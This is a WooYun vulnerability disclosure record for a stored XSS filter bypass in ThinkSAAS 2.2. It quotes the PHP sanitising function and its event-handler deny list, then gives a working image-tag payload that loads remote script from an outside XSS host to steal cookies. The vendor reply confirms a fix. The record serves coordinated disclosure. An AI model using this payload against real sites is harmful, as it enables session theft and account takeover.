{"id": 53179, "wybug_id": "wooyun-2014-068554", "wybug_title": "ThinkSAAS 2.2  存储型XSS(绕过防护机制)", "wybug_corp": "thinksaas.cn", "wybug_author": "roker", "wybug_date": "2014-07-15 09:14", "wybug_open_date": "2014-10-13 09:58", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-13：\t细节向公众公开  简要描述： rt 详细说明：  富文本过滤的代码片段：\nfunction cleanJs($text) {\t$text = trim ( $text );\t//$text = stripslashes ( $text );\t// 完全过滤注释\t$text = @preg_replace ( '/<!--?.*-->/', '', $text );\t// 完全过滤动态代码\t$text = @preg_replace ( '/<\\?|\\?>/', '', $text );\t// 完全过滤js\t$text = @preg_replace ( '/<script?.*\\/script>/', '', $text );\t// 过滤多余html\t$text = @preg_replace ( '/<\\/?(html|head|meta|link|base|body|title|style|script|form|iframe|frame|frameset|math|maction|marquee)[^><]*>/i', '', $text );\t// 过滤on事件lang js\twhile ( preg_match ( '/(<[^><]+)(data|onmouse|onexit|onclick|onkey|onsuspend|onabort|onactivate|onafterprint|onafterupdate|onbeforeactivate|onbeforecopy|onbeforecut|onbeforedeactivate|onbeforeeditfocus|onbeforepaste|onbeforeprint|onbeforeunload|onbeforeupdate|onblur|onbounce|oncellchange|onchange|onclick|oncontextmenu|oncontrolselect|oncopy|oncut|ondataavailable|ondatasetchanged|ondatasetcomplete|ondblclick|ondeactivate|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|onerror|onerrorupdate|onfilterchange|onfinish|onfocus|onfocusin|onfocusout|onhelp|onkeydown|onkeypress|onkeyup|onlayoutcomplete|onload|onlosecapture|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseout|onmouseover|onmouseup|onmousewheel|onmove|onmoveend|onmovestart|onpaste|onpropertychange|onreadystatechange|onreset|onresize|onresizeend|onresizestart|onrowenter|onrowexit|onrowsdelete|onrowsinserted|onscroll|onselect|onselectionchange|onselectstart|onstart|onstop|onsubmit|onunload)[^><]+/i', $text, $mat ) ) {\t\t$text = str_replace ( $mat [0], $mat [1], $text );\t}\twhile ( preg_match ( '/(<[^><]+)(window\\.|javascript:|js:|about:|file:|document\\.|vbs:|cookie)([^><]*)/i', $text, $mat ) ) {\t\t$text = str_replace ( $mat [0], $mat [1] . $mat [3], $text );\t}\treturn $text;}\n看到对事件的过滤 \nwhile ( preg_match ( '/(<[^><]+)(data|onmouse|onexit|onclick|onkey|onsuspend|onabort|onactivate|onafterprint|onafterupdate|onbeforeactivate|onbeforecopy|onbeforecut|onbeforedeactivate|onbeforeeditfocus|onbeforepaste|onbeforeprint|onbeforeunload|onbeforeupdate|onblur|onbounce|oncellchange|onchange|onclick|oncontextmenu|oncontrolselect|oncopy|oncut|ondataavailable|ondatasetchanged|ondatasetcomplete|ondblclick|ondeactivate|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|onerror|onerrorupdate|onfilterchange|onfinish|onfocus|onfocusin|onfocusout|onhelp|onkeydown|onkeypress|onkeyup|onlayoutcomplete|onload|onlosecapture|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseout|onmouseover|onmouseup|onmousewheel|onmove|onmoveend|onmovestart|onpaste|onpropertychange|onreadystatechange|onreset|onresize|onresizeend|onresizestart|onrowenter|onrowexit|onrowsdelete|onrowsinserted|onscroll|onselect|onselectionchange|onselectstart|onstart|onstop|onsubmit|onunload)[^><]+/i', $text, $mat ) ) {\t\t$text = str_replace ( $mat [0], $mat [1], $text );\t}\n过滤了这么多。。。可是 这个正则是有问题的，双引号包裹> 即可无视<>内的检测，我们可以提交任意on事件 - -这么多事件算是白写了。。像这样 加载远程js\n<img src=\">\" onerror=$.getScript(\"//xss.re/4985\")>\n官网测试下，\n\n加载了远程js\n\n盗取cookie等一系列操作\n\n   漏洞证明：  \n\n   修复方案：  可以参考下 这个http://www.leavesongs.com/PENETRATION/xsshtml.html   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2014-07-16 00:36 厂商回复： 感谢反馈。已经进行了修复。很快会更新到下载版本中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-20 20:25 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  靠，明明我在一个月前提交了，你的却比我的先审核...    \n     2014-07-20 21:24 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @BadCat 你咋知道你和我是一样的。。。    \n     2014-07-21 05:39 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  @roker 是tsClean?    \n     2014-07-21 07:43 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @BadCat 不是哦。    \n     2014-07-21 15:32 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  @roker cleanJS?    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}